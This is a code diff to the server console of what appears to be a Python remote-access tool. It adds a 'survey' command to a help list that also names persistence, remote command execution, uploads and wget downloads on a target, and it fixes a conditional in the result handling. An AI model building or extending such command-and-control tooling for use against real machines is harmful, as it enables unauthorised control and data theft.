@@ -37,11 +37,12 @@ persistence         - Apply persistence mechanism.
 quit                - Gracefully kill client and server.
 rekey               - Regenerate crypto key.
 run <command>       - Execute a command on the target.
+survey              - Run a system survey.
 unzip <file>        - Unzip a file.
 upload <files>      - Upload files(s).
 wget <url>          - Download a file from the web.'''
 COMMANDS = [ 'download', 'help', 'persistence', 'quit', 'rekey', 'run',
-             'unzip', 'upload', 'wget' ]
+             'survey', 'unzip', 'upload', 'wget' ]
 
 
 def get_parser():
@@ -124,8 +125,8 @@ def main():
         elif cmd == 'rekey':
             DHKEY = crypto.diffiehellman(conn, server=True)
 
-        # results of persistence, unzip, or wget
-        elif cmd == 'persistence' or 'unzip' or 'wget':
+        # results of survey, persistence, unzip, or wget
+        elif cmd in ['survey', 'persistence', 'unzip', 'wget']:
             print 'Running {}...'.format(cmd)
             recv_data = conn.recv(1024)
             print crypto.AES_decrypt(recv_data, DHKEY)
